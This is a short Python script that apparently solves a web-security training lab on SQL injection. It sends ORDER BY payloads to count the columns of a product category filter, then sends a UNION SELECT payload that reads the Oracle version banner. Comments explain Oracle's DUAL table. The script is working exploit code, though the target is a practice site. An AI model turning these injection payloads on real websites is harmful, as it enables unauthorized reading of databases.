import requests
import urllib3

# Suppress warning about unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}

base_url = "https://0a11001803dee72080941c5200b400e2.web-security-academy.net/filter"

session = requests.Session()

def find_no_column(max_column=5):
    last_valid = 0  # store the last number with no error
    for i in range(1, max_column + 1):
        payload = f"Pets' ORDER BY {i}--" # Used to identify the number of columns
        params = {'category': payload}
        response = session.get(base_url, params=params, verify=False, proxies=proxies)

        if "Internal Server Error" in response.text:
            print(f"Tested ORDER BY {i} - got error, stopping.")
            break
        else:
            print(f"Tested ORDER BY {i} - no error.")
            last_valid = i  # update last valid

    if last_valid > 0:
        print(f"Number of columns found: {last_valid}")
    else:
        print("No valid column number found.")

find_no_column()


#To determine the data types of the columns, we use UNION SELECT 'a', 'a'--. If 'a' 
#is visible in the response, then the column is likely of string type, and we can inject values into it.

# Here's a twist when dealing with Oracle databases:
# Using: UNION SELECT 'a', 'a'-- causes an error,
# but using: UNION SELECT 'a', 'a' FROM DUAL-- works correctly.
# Why? Because in Oracle, every SELECT statement must include a FROM clause.
# DUAL is a special one-row, one-column dummy table that satisfies this requirement.


response_version = session.get(base_url + "?category=Pets=' UNION SELECT banner, NULL from v$version--",verify=False,proxies=proxies)